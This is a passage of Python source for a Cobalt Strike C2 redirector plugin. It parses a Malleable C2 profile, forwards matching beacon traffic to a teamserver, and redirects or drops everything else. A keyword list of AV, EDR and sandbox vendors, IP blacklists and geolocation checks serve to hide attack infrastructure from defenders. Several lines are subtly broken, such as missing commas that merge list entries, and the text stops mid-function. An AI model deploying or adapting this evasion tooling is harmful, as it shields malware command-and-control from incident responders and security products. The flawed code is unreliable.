#!/usr/bin/python3
#
# This script acts as a HTTP/HTTPS reverse-proxy with several restrictions imposed upon which
# requests and from whom it should process, similarly to the .htaccess file in Apache2's mod_rewrite.
#
# malleable_redirector was created to resolve the problem of effective IR/AV/EDRs/Sandboxes evasion on the
# C2 redirector's backyard. 
#
# The proxy along with this plugin can both act as a CobaltStrike Teamserver C2 redirector, given Malleable C2
# profile used during the campaign and teamserver's hostname:port. The plugin will parse supplied malleable profile
# in order to understand which inbound requests may possibly come from the compatible Beacon or are not compliant with
# the profile and therefore should be misdirected. Sections such as http-stager, http-get, http-post and their corresponding 
# uris, headers, prepend/append patterns, User-Agent are all used to distinguish between legitimate beacon's request
# and some Internet noise or IR/AV/EDRs out of bound inquiries. 
#
# The plugin was also equipped with marvelous known bad IP ranges coming from:
#   curi0usJack and the others:
#   https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10
#
# Using a IP addresses blacklist along with known to be bad keywords lookup on Reverse-IP DNS queries and HTTP headers,
# is considerably increasing plugin's resiliency to the unauthorized peers wanting to examine protected infrastructure.
#
# Use wisely, stay safe.
#
# Example usage:
#   $ python3 proxy2.py -P 80/http -P 443/https -p plugins/malleable_redirector.py --config malleable-redir-config.yml
#
#   [INFO] 19:21:42: Loading 1 plugin...
#   [INFO] 19:21:42: Plugin "malleable_redirector" has been installed.
#   [INFO] 19:21:42: Preparing SSL certificates and keys for https traffic interception...
#   [INFO] 19:21:42: Using provided CA key file: ca-cert/ca.key
#   [INFO] 19:21:42: Using provided CA certificate file: ca-cert/ca.crt
#   [INFO] 19:21:42: Using provided Certificate key: ca-cert/cert.key
#   [INFO] 19:21:42: Serving http proxy on: 0.0.0.0, port: 80...
#   [INFO] 19:21:42: Serving https proxy on: 0.0.0.0, port: 443...
#   [INFO] 19:21:42: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:42: == Valid malleable http-get request inbound.
#   [INFO] 19:21:42: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#   [INFO] 19:21:42: [RESPONSE] HTTP 200 OK, length: 5543
#   [INFO] 19:21:45: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:45: == Valid malleable http-get request inbound.
#   [INFO] 19:21:45: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#   [INFO] 19:21:45: [RESPONSE] HTTP 200 OK, length: 5543
#   [INFO] 19:21:46: [REQUEST] GET /
#   [ERROR] 19:21:46: [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
#   [INFO] 19:21:46: [RESPONSE] HTTP 301 Moved Permanently, length: 212
#   [INFO] 19:21:48: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:48: == Valid malleable http-get request inbound.
#   [INFO] 19:21:48: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#
# The above output contains a line pointing out that there has been an unauthorized, not compliant with our C2 
# profile inbound request, which got dropped due to incompatible User-Agent string presented:
#   [...]
#   [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
#   [...]
#
# Requirements:
#   - brotli
#   - yaml
#
# Author:
#   Mariusz B. / mgeeky, '20
#   <mb@binary-offensive.com>
#

import re, sys
import os
import socket
import pprint
import requests
import random
import os.path
import ipaddress
import yaml, json
from urllib.parse import urlparse, parse_qsl, parse_qs, urlsplit
from IProxyPlugin import *



BANNED_AGENTS = (
    # Dodgy User-Agents words
    'curl', 'wget', 'python-urllib', 'lynx', 'slackbot-linkexpanding'

    # Generic bad words
    'security', 'scanning', 'scanner', 'defender', 'cloudfront', 'appengine-google'

    # Bots
    'googlebot', 'adsbot-google', 'msnbot', 'altavista', 'slurp', 'mj12bot',
    'bingbot', 'duckduckbot', 'baiduspider', 'yandexbot', 'simplepie', 'sogou',
    'exabot', 'facebookexternalhit', 'ia_archiver', 'virustotalcloud', 'virustotal'

    # EDRs
    'bitdefender', 'carbonblack', 'carbon', 'code42', 'countertack', 'countercept', 
    'crowdstrike', 'cylance', 'druva', 'forcepoint', 'ivanti', 'sentinelone', 
    'trend micro', 'gravityzone', 'trusteer', 'cybereason', 'encase', 'ensilo', 
    'huntress', 'bluvector', 'cynet360', 'endgame', 'falcon', 'fortil', 'gdata', 
    'lightcyber', 'secureworks', 'apexone', 'emsisoft', 'netwitness', 'fidelis', 

    # AVs
    'acronis', 'adaware', 'aegislab', 'ahnlab', 'antiy', 'secureage', 
    'arcabit', 'avast', 'avg', 'avira', 'bitdefender', 'clamav', 
    'comodo', 'crowdstrike', 'cybereason', 'cylance', 'cyren', 
    'drweb', 'emsisoft', 'endgame', 'escan', 'eset', 'f-secure', 
    'fireeye', 'fortinet', 'gdata', 'ikarussecurity', 'k7antivirus', 
    'k7computing', 'kaspersky', 'malwarebytes', 'mcafee', 'nanoav', 
    'paloaltonetworks', 'panda', '360totalsecurity', 'sentinelone', 
    'sophos', 'symantec', 'tencent', 'trapmine', 'trendmicro', 'virusblokada', 
    'anti-virus', 'antivirus', 'yandex', 'zillya', 'zonealarm', 
    'checkpoint', 'baidu', 'kingsoft', 'superantispyware', 'tachyon', 
    'totaldefense', 'webroot', 'egambit', 'trustlook'

    # Other proxies, sandboxes etc
    'zscaler', 'barracuda', 'sonicwall', 'f5 network', 'palo alto network', 'juniper', 'check point'
)

class IPLookupHelper:
    supported_providers = (
        'ipapi_co',
        'ip_api_com',
        'ipgeolocation_io',
    )

    cached_lookups_file = 'ip-lookups-cache.json'

    def __init__(self, logger, apiKeys):
        self.logger = logger
        self.apiKeys = {
            'ip_api_com': 'this-provider-not-requires-api-key-for-free-plan',
            'ipapi_co': 'this-provider-not-requires-api-key-for-free-plan',
        }

        if len(apiKeys) > 0:
            for prov in IPLookupHelper.supported_providers:
                if prov in apiKeys.keys():
                    if len(apiKeys[prov].strip()) < 2: continue
                    self.apiKeys[prov] = apiKeys[prov].strip()

        self.cachedLookups = {}

        self.logger.dbg('Following IP Lookup providers will be used: ' + str(list(self.apiKeys.keys())))

        try:
            with open(IPLookupHelper.cached_lookups_file) as f:
                data = f.read()
                if len(data) > 0:
                    cached = json.loads(data)
                    self.cachedLookups = cached
                    self.logger.dbg(f'Read {len(cached)} cached entries from file.')

        except json.decoder.JSONDecodeError as e:
            self.logger.err(f'Corrupted JSON data in cache file: {IPLookupHelper.cached_lookups_file}! Error: {e}')
            raise

        except FileNotFoundError as e:
            with open(IPLookupHelper.cached_lookups_file, 'w') as f:
                json.dump({}, f)

        except Exception as e:
            self.logger.err(f'Exception raised while loading cached lookups from file ({IPLookupHelper.cached_lookups_file}: {e}')
            raise

    def lookup(self, ipAddress):
        if len(self.apiKeys) == 0:
            return

        if ipAddress in self.cachedLookups.keys():
            self.logger.dbg(f'Returning cached entry for IP address: {ipAddress}')
            return self.cachedLookups[ipAddress]

        leftProvs = list(self.apiKeys.keys())
        result = {}

        while len(leftProvs) > 0:
            prov = random.choice(leftProvs)

            if hasattr(self, prov) != None:
                method = getattr(self, prov)
                self.logger.dbg(f'Calling IP Lookup provider: {prov}')
                result = method(ipAddress)

                if len(result) > 0:
                    result = self.normalizeResult(result)
                    break

                leftProvs.remove(prov)

        if len(result) > 0:
            self.cachedLookups[ipAddress] = result

            with open(IPLookupHelper.cached_lookups_file, 'w') as f:
                json.dump(self.cachedLookups, f)

            self.logger.dbg(f'New IP lookup entry cached: {ipAddress}')

        return result

    def normalizeResult(self, result):
        # Returns JSON similar to the below:
        # {
        #   "organization": [
        #     "Tinet SpA",
        #     "Zscaler inc.",
        #     "AS62044 Zscaler Switzerland GmbH"
        #   ],
        #   "continent": "Europe",
        #   "country": "Germany",
        #   "continent_code": "EU",
        #   "ip": "89.167.131.40",
        #   "city": "Frankfurt am Main",
        #   "timezone": "Europe/Berlin",
        #   "fulldata": {
        #     "status": "success",
        #     "country": "Germany",
        #     "countryCode": "DE",
        #     "region": "HE",
        #     "regionName": "Hesse",
        #     "city": "Frankfurt am Main",
        #     "zip": "60314",
        #     "lat": 50.1103,
        #     "lon": 8.7147,
        #     "timezone": "Europe/Berlin",
        #     "isp": "Zscaler inc.",
        #     "org": "Tinet SpA",
        #     "as": "AS62044 Zscaler Switzerland GmbH",
        #     "query": "89.167.131.40"
        #   }
        # }

        def update(out, data, keydst, keysrc):
            if keysrc in data.keys(): 
                if type(out[keydst]) == list: out[keydst].append(data[keysrc])
                else: out[keydst] = data[keysrc]

        output = {
            'organization' : [],
            'continent' : '',
            'continent_code' : '',
            'country' : '',
            'country_code' : '',
            'ip' : '',
            'city' : '',
            'timezone' : '',
            'fulldata' : {}
        }

        continentCodeToName = {
            'AF' : 'Africa',
            'AN' : 'Antarctica',
            'AS' : 'Asia',
            'EU' : 'Europe',
            'NA' : 'North america',
            'OC' : 'Oceania',
            'SA' : 'South america'
        }

        output['fulldata'] = result

        update(output, result, 'organization', 'org')
        update(output, result, 'organization', 'isp')
        update(output, result, 'organization', 'as')
        update(output, result, 'organization', 'organization')
        update(output, result, 'ip', 'ip')
        update(output, result, 'ip', 'query')
        update(output, result, 'timezone', 'timezone')
        if 'time_zone' in result.keys():
            update(output, result['time_zone'], 'timezone', 'name')
        update(output, result, 'city', 'city')

        update(output, result, 'country', 'country_name')
        if ('country' not in output.keys() or output['country'] == '') and \
            ('country' in result.keys() and result['country'] != ''):
            update(output, result, 'country', 'country')

        update(output, result, 'country_code', 'country_code')
        if ('country_code' not in output.keys() or output['country_code'] == '') and \
            ('country_code2' in result.keys() and result['country_code2'] != ''):
            update(output, result, 'country_code', 'country_code2')

        update(output, result, 'country_code', 'countryCode')

        update(output, result, 'continent', 'continent')
        update(output, result, 'continent', 'continent_name')
        update(output, result, 'continent_code', 'continent_code')

        if ('continent_code' not in result.keys() or result['continent_code'] == '') and \
            ('continent_name' in result.keys() and result['continent_name'] != ''):
            cont = result['continent_name'].lower()
            for k, v in continentCodeToName.items():
                if v.lower() == cont:
                    output['continent_code'] = k
                    break

        elif ('continent_code' in result.keys() and result['continent_code'] != '') and \
            ('continent_name' not in result.keys() or result['continent_name'] == ''):
            output['continent'] = continentCodeToName[result['continent_code'].upper()]
        
        elif 'timezone' in result.keys() and result['timezone'] != '':
            cont = result['timezone'].split('/')[0].strip().lower()
            for k, v in continentCodeToName.items():
                if v.lower() == cont:
                    output['continent_code'] = k
                    output['continent'] = v
                    break

        return output

    def ip_api_com(self, ipAddress):
        # $ curl -s ip-api.com/json/89.167.131.40                                                                                                                  [21:05]
        # {
        #   "status": "success",
        #   "country": "Germany",
        #   "countryCode": "DE",
        #   "region": "HE",
        #   "regionName": "Hesse",
        #   "city": "Frankfurt am Main",
        #   "zip": "60314",
        #   "lat": 50.1103,
        #   "lon": 8.7147,
        #   "timezone": "Europe/Berlin",
        #   "isp": "Zscaler inc.",
        #   "org": "Tinet SpA",
        #   "as": "AS62044 Zscaler Switzerland GmbH",
        #   "query": "89.167.131.40"
        # }

        try:
            r = requests.get(f'http://ip-api.com/json/{ipAddress}')

            if r.status_code != 200:
                raise Exception(f'ip-api.com returned unexpected status code: {r.status_code}.\nOutput text:\n' + r.json())

            return r.json()

        except Exception as e:
            self.logger.err(f'Exception catched while querying ip-api.com with {ipAddress}:\nName: {e}')

        return {}

    def ipapi_co(self, ipAddress):
        # $ curl 'https://ipapi.co/89.167.131.40/json/' 
        # {
        #    "ip": "89.167.131.40",
        #    "city": "Frankfurt am Main",
        #    "region": "Hesse",
        #    "region_code": "HE",
        #    "country": "DE",
        #    "country_code": "DE",
        #    "country_code_iso3": "DEU",
        #    "country_capital": "Berlin",
        #    "country_tld": ".de",
        #    "country_name": "Germany",
        #    "continent_code": "EU",
        #    "in_eu": true,
        #    "postal": "60314",
        #    "latitude": 50.1103,
        #    "longitude": 8.7147,
        #    "timezone": "Europe/Berlin",
        #    "utc_offset": "+0200",
        #    "country_calling_code": "+49",
        #    "currency": "EUR",
        #    "currency_name": "Euro",
        #    "languages": "de",
        #    "country_area": 357021.0,
        #    "country_population": 81802257.0,
        #    "asn": "AS62044",
        #    "org": "Zscaler Switzerland GmbH"
        # }

        try:
            r = requests.get(f'https://ipapi.co/{ipAddress}/json/')

            if r.status_code != 200:
                raise Exception(f'ipapi.co returned unexpected status code: {r.status_code}.\nOutput text:\n' + r.json())

            return r.json()

        except Exception as e:
            self.logger.err(f'Exception catched while querying ipapi.co with {ipAddress}:\nName: {e}')

        return {}

    def ipgeolocation_io(self, ipAddress):
        # $ curl 'https://api.ipgeolocation.io/ipgeo?apiKey=API_KEY&ip=89.167.131.40'
        # {
        #   "ip": "89.167.131.40",
        #   "continent_code": "EU",
        #   "continent_name": "Europe",
        #   "country_code2": "DE",
        #   "country_code3": "DEU",
        #   "country_name": "Germany",
        #   "country_capital": "Berlin",
        #   "state_prov": "Hesse",
        #   "district": "Innenstadt III",
        #   "city": "Frankfurt am Main",
        #   "zipcode": "60314",
        #   "latitude": "50.12000",
        #   "longitude": "8.73527",
        #   "is_eu": true,
        #   "calling_code": "+49",
        #   "country_tld": ".de",
        #   "languages": "de",
        #   "country_flag": "https://ipgeolocation.io/static/flags/de_64.png",
        #   "geoname_id": "6946227",
        #   "isp": "Tinet SpA",
        #   "connection_type": "",
        #   "organization": "Zscaler Switzerland GmbH",
        #   "currency": {
        #     "code": "EUR",
        #     "name": "Euro",
        #     "symbol": "€"
        #   },
        #   "time_zone": {
        #     "name": "Europe/Berlin",
        #     "offset": 1,
        #     "current_time": "2020-07-29 22:31:23.293+0200",
        #     "current_time_unix": 1596054683.293,
        #     "is_dst": true,
        #     "dst_savings": 1
        #   }
        # }
        try:
            r = requests.get(f'https://api.ipgeolocation.io/ipgeo?apiKey={self.apiKeys["ipgeolocation_io"]}&ip={ipAddress}')

            if r.status_code != 200:
                raise Exception(f'ipapi.co returned unexpected status code: {r.status_code}.\nOutput text:\n' + r.json())

            return r.json()

        except Exception as e:
            self.logger.err(f'Exception catched while querying ipapi.co with {ipAddress}:\nName: {e}')

        return {}

class IPGeolocationDeterminant:
    supported_determinants = (
        'organization',
        'continent',
        'continent_code',
        'country',
        'country_code',
        'city',
        'timezone'
    )

    def __init__(self, logger, determinants):
        self.logger = logger
        if type(determinants) != dict:
            raise Exception('Specified ip_geolocation_requirements must be a valid dictonary!')

        self.determinants = {}

        for k, v in determinants.items():
            k = k.lower()
            if k in IPGeolocationDeterminant.supported_determinants:
                if type(v) == str:   
                    self.determinants[k] = [v, ]
                elif type(v) == list or type(v) == tuple:
                    self.determinants[k] = v
                elif type(v) == type(None):
                    self.determinants[k] = []
                else:
                    raise Exception(f'Specified ip_geolocation_requirements[{k}] must be either string or list! Unknown type met: {type(v)}')

                for i in range(len(self.determinants[k])):
                    if self.determinants[k][i] == None:
                        self.determinants[k][i] = ''

    def determine(self, ipLookupResult):
        if type(ipLookupResult) != dict or len(ipLookupResult) == 0:
            raise Exception(f'Given IP geolocation results object was either empty or not a dictionary: {ipLookupResult}!')

        result = True
        checked = 0

        for determinant, expected in self.determinants.items():
            if len(expected) == 0 or sum([len(x) for x in expected]) == 0: continue

            if determinant in ipLookupResult.keys():
                checked += 1
                matched = False

                for georesult in ipLookupResult[determinant]:
                    georesult = georesult.lower()

                    for exp in expected:
                        if georesult in exp.lower():
                            self.logger.dbg(f'IP Geo result {determinant} value "{georesult}" met expected value "{exp}"')
                            matched = True
                            break

                        m = re.search(exp, georesult, re.I)
                        if m:
                            self.logger.dbg(f'IP Geo result {determinant} value "{georesult}" met expected regular expression: ({exp})')
                            matched = True
                            break    

                    if matched: 
                        break                    

                if not matched:
                    self.logger.dbg(f'IP Geo result {determinant} values {ipLookupResult[determinant]} DID NOT met expected set {expected}')
                    result = False

        return result


class MalleableParser:
    def __init__(self, logger):
        self.path = ''
        self.data = ''
        self.datalines = []
        self.logger = logger
        self.parsed = {}
        self.config = self.parsed

    def get_config(self):
        return self.config

    def parse(self, path):
        with open(path, 'r') as f:
            self.data = f.read().replace('\r\n', '\n')
            self.datalines = self.data.split('\n')

        pos = 0
        linenum = 0
        depth = 0
        dynkey = []
        parsed = self.parsed

        for line in self.datalines:
            linenum += 1

            assert len(dynkey) == depth, "Depth ({}) and dynkey differ ({})".format(depth, dynkey)

            if line.strip() == '': continue
            if line.lstrip().startswith('#'): 
                pos += len(line) + 1
                continue

            self.logger.dbg('[key: {}, line: {}, pos: {}] {}'.format(str(dynkey), linenum-1, pos, line[:100]))

            parsed = self.parsed
            for key in dynkey:
                parsed = parsed[key]

            matched = False

            # Finds: set name "value";
            m = re.match(r"set\s+(\w+)\s+(?=(?:(?<!\w)'(\S.*?)'(?!\w)|\"(\S.*?)\"(?!\w)))", line)
            if m:
                n = list(filter(lambda x: x != None, m.groups()[2:]))[0]
                self.logger.dbg('Extracted variable: [{}] = [{}]'.format(m.group(1), n))
                parsed[m.group(1)] = n.replace('\\\\', '\\')
                matched = 'set'
                continue

            # Finds: section { as well as variant-driven: section "variant" {
            m = re.match(r'^\s*([\w-]+)(\s+"[^"]+")?\s*\{', line)
            if m:
                depth += 1
                section = m.group(1)
                dynkey.append(section)
                parsed[section] = {
                    'variant': 'default'
                }

                if m.group(2) is not None:
                    parsed[section]['variant'] = m.group(2).strip()
                
                self.logger.dbg('Extracted section: [{}] (variant: {})'.format(section, parsed[section]['variant']))
                matched = 'section'
                continue

            if line.strip() == '}':
                depth -= 1
                matched = 'endsection'
                sect = dynkey.pop()
                variant = ''

                if sect in parsed.keys() and 'variant' in parsed[sect].keys():
                    variant = '(variant: {})'.format(parsed[sect]['variant'])

                self.logger.dbg('Reached end of section {}{}'.format(sect, variant))
                continue

            # Finds: [set] parameter ["value", ...];
            m = re.search(r'(?:([\w-]+)\s+(?=")".*")|(?:([\w-]+)(?=;))', line, re.I)
            if m:
                paramname = list(filter(lambda x: x != None, m.groups()))[0]
                restofline = line[line.find(paramname) + len(paramname):]
                values = []
                for n in re.finditer(r"(?=(?:(?<!\w)'(\S.*?)'(?!\w)|\"(\S.*?)\"(?!\w)))", restofline):
                    paramval = list(filter(lambda x: x != None, n.groups()[1:]))[0]
                    values.append(paramval.replace('\\\\', '\\'))

                if values == []:
                    values = ''
                elif len(values) == 1:
                    values = values[0]

                if paramname in parsed.keys():
                    if type(parsed[paramname]) == list:
                        parsed[paramname].append(values)
                    else:
                        parsed[paramname] = [parsed[paramname], values]
                else:
                    if type(values) == list:
                        parsed[paramname] = [values, ]
                    else:
                        parsed[paramname] = values

                self.logger.dbg('Extracted complex variable: [{}] = [{}]'.format(paramname, str(values)[:100]))
                matched = 'complexset'
                continue

            self.logger.err("Unexpected statement:\n\t{}".format(line))
            self.logger.err("\nParsing failed.")
            return False

        return True

class ProxyPlugin(IProxyPlugin):

    DefaultRedirectorConfig = {
        'drop_action': 'redirect',
        'action_url': 'https://google.com',
        'log_dropped': False,
        'ban_blacklisted_ip_addresses': True,
        'ip_addresses_blacklist_file': 'plugins/malleable_banned_ips.txt',
        'verify_peer_ip_details': True,
        'ip_details_api_keys': {},
        'ip_geolocation_requirements': {}
    }

    def __init__(self, logger, proxyOptions):
        self.is_request = False
        self.logger = logger
        self.addToResHeaders = {}
        self.proxyOptions = proxyOptions
        self.malleable = None
        self.ipLookupHelper = None
        self.ipGeolocationDeterminer = None

        self.banned_ips = {}

    @staticmethod
    def get_name():
        return 'malleable_redirector'

    def drop_reason(self, text):
        self.logger.err(text)
        if 'X-Drop-Reason' in self.addToResHeaders.keys():
            self.addToResHeaders['X-Drop-Reason'] += '; ' + text
        else:
            self.addToResHeaders['X-Drop-Reason'] = text


    def help(self, parser):
        parametersRequiringDirectPath = (
            'ip_addresses_blacklist_file',
            'profile'
        )

        if parser != None:
            parser.add_argument('--redir-config', 
                metavar='PATH', dest='redir_config',
                help='Path to the malleable-redirector\'s YAML config file. Not required if global proxy\'s config file was specified (--config) and includes options required by this plugin.'
            )

        else:
            if not self.proxyOptions['config'] and not self.proxyOptions['redir_config']:
                self.logger.fatal('Malleable-redirector config file not specified (--redir-config)!')

            redirectorConfig = {}
            configBasePath = ''
            try:
                if not self.proxyOptions['config'] and self.proxyOptions['redir_config'] != '':
                    with open(self.proxyOptions['redir_config']) as f:
                        redirectorConfig = yaml.load(f, Loader=yaml.FullLoader)

                    self.proxyOptions.update(redirectorConfig)

                    for k, v in ProxyPlugin.DefaultRedirectorConfig.items():
                        if k not in self.proxyOptions.keys():
                            self.proxyOptions[k] = v

                    configBasePath = os.path.dirname(os.path.abspath(self.proxyOptions['redir_config']))
                else:
                    configBasePath = os.path.dirname(os.path.abspath(self.proxyOptions['config']))

                self.ipLookupHelper = IPLookupHelper(self.logger, self.proxyOptions['ip_details_api_keys'])
                self.ipGeolocationDeterminer = IPGeolocationDeterminant(self.logger, self.proxyOptions['ip_geolocation_requirements'])

                for paramName in parametersRequiringDirectPath:
                    if paramName in self.proxyOptions.keys() and \
                        self.proxyOptions[paramName] != '' and self.proxyOptions[paramName] != None:
                        self.proxyOptions[paramName] = os.path.join(configBasePath, self.proxyOptions[paramName])

            except FileNotFoundError as e:
                self.logger.fatal(f'Malleable-redirector config file not found: ({self.proxyOptions["config"]})!')

            except Exception as e:
                self.logger.fatal(f'Unhandled exception occured while parsing Malleable-redirector config file: {e}')

            if not self.proxyOptions['profile']:
                self.logger.fatal('Malleable C2 profile path must be specified!')

            self.malleable = MalleableParser(self.logger)

            self.logger.dbg(f'Parsing input Malleable profile: ({self.proxyOptions["profile"]})')
            if not self.malleable.parse(self.proxyOptions['profile']):
                self.logger.fatal('Could not parse specified Malleable C2 profile!')

            if not self.proxyOptions['action_url']:
                self.logger.fatal('Drop URL must be specified!')

            if not self.proxyOptions['teamserver_url']:
                self.logger.fatal('Teamserver URL must be specified!')

            if type(self.proxyOptions['teamserver_url']) == str:
                self.proxyOptions['teamserver_url'] = [self.proxyOptions['teamserver_url'], ]

            try:
                inports = []
                for ts in self.proxyOptions['teamserver_url']:
                    inport, scheme, host, port = self.interpretTeamserverUrl(ts)
                    if inport != 0: inports.append(inport)

                    o = ''
                    if port < 1 or port > 65535: raise Exception()
                    if inport != 0:
                        if inport < 1 or inport > 65535: raise Exception()
                        o = 'originating from {} '.format(inport)

                    self.logger.dbg('Will pass inbound beacon traffic {}to {}{}:{}'.format(
                        o, scheme+'://' if len(scheme) else '', host, port
                    ))

                if len(inports) != len(self.proxyOptions['teamserver_url']) and len(self.proxyOptions['teamserver_url']) > 1:
                    self.logger.fatal('Please specify inport:host:port form of teamserver-url parameter for each listening port of proxy2')

            except Exception as e:
                raise
                self.logger.fatal('Teamserver\'s URL does not follow <[https?://]host:port> scheme! {}'.format(str(e)))

            if (not self.proxyOptions['drop_action']) or (self.proxyOptions['drop_action'] not in ['redirect', 'reset', 'proxy']):
                self.logger.fatal('Drop action must be specified as either "reset", redirect" or "proxy"!')
            
            if self.proxyOptions['drop_action'] == 'proxy':
                if self.proxyOptions['action_url'] == '':
                    self.logger.fatal('Drop URL must be specified for proxy action - pointing from which host to fetch responses!')
                else:
                    self.logger.info('Will proxy requests from: {}'.format(self.proxyOptions['action_url']), color=self.logger.colors_map['cyan'])

            if self.proxyOptions['ban_blacklisted_ip_addresses']:
                with open(self.proxyOptions['ip_addresses_blacklist_file'], 'r') as f:
                    for line in f.readlines():
                        l = line.strip()
                        if l.startswith('#') or len(l) < 7: continue

                        if '#' in l:
                            ip = l[:l.find('#')].strip()
                            comment = l[l.find('#')+1:].strip()
                            self.banned_ips[ip] = comment
                        else:
                            self.banned_ips[l] = ''

                self.logger.info('Loaded {} blacklisted CIDRs.'.format(len(self.banned_ips)))


    def interpretTeamserverUrl(self, ts):
        inport = 0
        host = ''
        scheme = ''
        port = 0

        try:
            _ts = ts.split(':')
            inport = int(_ts[0])
            ts = ':'.join(_ts[1:])
        except: pass
         
        u = urlparse(ts)
        scheme, _host = u.scheme, u.netloc
        if _host:
            host, _port = _host.split(':')
        else:
            host, _port = ts.split(':')

        port = int(_port)

        return inport, scheme, host, port

    def pickTeamserver(self, req):
        self.logger.dbg('Peer reached the server at port: ' + str(req.server.server_port))
        for s in self.proxyOptions['teamserver_url']:
            u = urlparse(req.path)
            inport, scheme, host, port = self.interpretTeamserverUrl(s)
            if inport == req.server.server_port:
                return s
            elif inport == '':
                return s

        #return req.path
        return random.choice(self.proxyOptions['teamserver_url'])

    def redirect(self, req, _target):
        # Passing the request forward.
        u = urlparse(req.path)
        scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)

        target = _target

        if target in self.proxyOptions['teamserver_url']:
            inport, scheme, host, port = self.interpretTeamserverUrl(target)
            if not scheme: scheme = 'https'

            w = urlparse(target)
            scheme2, netloc2, path2 = w.scheme, w.netloc, (w.path + '?' + w.query if w.query else w.path)
            req.path = '{}://{}:{}{}'.format(scheme, host, port, (u.path + '?' + u.query if u.query else u.path))
        else:
            if not target.startswith('http'):
                if req.is_ssl:
                    target = 'https://' + target
                else:
                    target = 'http://' + target

            w = urlparse(target)
            scheme2, netloc2, path2 = w.scheme, w.netloc, (w.path + '?' + w.query if w.query else w.path)
            if netloc2 == '': netloc2 = req.headers['Host']

            req.path = '{}://{}{}'.format(scheme2, netloc2, (u.path + '?' + u.query if u.query else u.path))

        self.logger.dbg('Redirecting to "{}"'.format(req.path))
        return None

    def request_handler(self, req, req_body):
        self.is_request = True
        self.req = req
        self.req_body = req_body
        self.res = None
        self.res_body = None

        if self.drop_check(req, req_body):
            if self.proxyOptions['drop_action'] == 'proxy' and self.proxyOptions['action_url']:
                return self.redirect(req, self.proxyOptions['action_url'])  
            return self.drop_action(req, req_body, None, None)

        return self.redirect(req, self.pickTeamserver(req))

    def response_handler(self, req, req_body, res, res_body):
        self.is_request = False
        self.req = req
        self.req_body = req_body
        self.res = res
        self.res_body = res_body

        if self.drop_check(req, req_body):
            self.logger.dbg('Not returning body from response handler')
            return self.drop_action(req, req_body, res, res_body, True)

        # A nifty hack to make the proxy2 believe we actually modified the response
        # so that the proxy will not encode it to gzip (or anything specified) and just
        # return the response as-is, in an "Content-Encoding: identity" kind of fashion
        res.headers[proxy2_metadata_headers['override_response_content_encoding']] = 'identity'
        return res_body

    def drop_action(self, req, req_body, res, res_body, quiet = False):

        todo = ''
        if self.proxyOptions['drop_action'] == 'reset': todo = 'DROPPING'
        elif self.proxyOptions['drop_action'] == 'redirect': todo = 'REDIRECTING'
        elif self.proxyOptions['drop_action'] == 'proxy': todo = 'PROXYING'

        u = urlparse(req.path)
        scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)

        peer = req.client_address[0]

        try:
            resolved = socket.gethostbyaddr(req.client_address[0])[0]
            peer += ' ({})'.format(resolved)
        except:
            pass

        if not quiet: self.logger.err('[{} invalid request from {}] {} {}'.format(
            todo, peer, req.command, path
        ))

        if self.proxyOptions['log_dropped'] == True:
            req_headers = req.headers
            if req_body != None and len(req_body) > 0:
                if type(req_body) == type(b''): 
                    req_body = req_body.decode()
                req_body = '\r\n' + req_body
            else:
                req_body = ''

            request = '{} {} {}\r\n{}{}'.format(
                req.command, path, 'HTTP/1.1', req_headers, req_body
            )

            if not quiet: self.logger.err('\n\n{}'.format(request))

        if self.proxyOptions['drop_action'] == 'reset':
            return DropConnectionException('Not a conformant beacon request.')

        elif self.proxyOptions['drop_action'] == 'redirect':
            if self.is_request:
                return DontFetchResponseException('Not a conformant beacon request.')

            if res == None: 
                self.logger.err('Response handler received a None res object.')
                return res_body 

            res.status = 301
            res.response_version = 'HTTP/1.1'
            res.reason = 'Moved Permanently'
            res_body = '''<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="{}">here</A>.{}
</BODY></HTML>'''.format(self.proxyOptions['action_url'], str(self.addToResHeaders))

            res.headers = {
                'Server' : 'nginx',
                'Location': self.proxyOptions['action_url'],
                'Cache-Control' : 'no-cache',
                'Content-Type':'text/html; charset=UTF-8',
            }

            if len(self.addToResHeaders) > 0:
                #res.headers.update(self.addToResHeaders)
                self.addToResHeaders.clear()

            return res_body.encode()

        elif self.proxyOptions['drop_action'] == 'proxy':
            self.logger.dbg('Proxying forward...')

        if self.is_request: 
            return req_body

        return res_body

    def drop_check(self, req, req_body):
        peerIP = req.client_address[0]

        #self.logger.dbg(f'Validating incoming peer: {peerIP}')

        if len(self.proxyOptions['whitelisted_ip_addresses']) > 0:
            for cidr in self.proxyOptions['whitelisted_ip_addresses']:
                cidr = cidr.strip()
                if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
                    self.logger.info('[{}: ALLOW, reason:0] peer\'s IP address is whitelisted: ({})'.format(
                        peerIP, cidr
                    ), color='green')
                    return False

        # User-agent conformancy
        if req.headers.get('User-Agent') != self.malleable.config['useragent']:
            if self.is_request:
                self.drop_reason(f'[{peerIP}: DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.')
                self.logger.dbg('Inbound UA: "{}", Expected: "{}"'.format(
                    req.headers.get('User-Agent'), self.malleable.config['useragent']))
            return True

        # Banned words check
        for k, v in req.headers.items():
            kv = k.split('-')
            vv = v.split(' ') + v.split('-')
            for kv1 in kv:
                if kv1.lower() in BANNED_AGENTS:
                    self.drop_reason('[{}: DROP, reason:2] HTTP header name contained banned word: "{}"'.format(peerIP, kv1))
                    return True

            for vv1 in vv:
                if vv1.lower() in BANNED_AGENTS:
                    self.drop_reason('[{}: DROP, reason:3] HTTP header value contained banned word: "{}"'.format(peerIP, vv1))
                    return True

        if self.proxyOptions['ban_blacklisted_ip_addresses']:
            for cidr, _comment in self.banned_ips.items():
                if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
                    comment = ''
                    if len(_comment) > 0:
                        comment = ' - ' + _comment

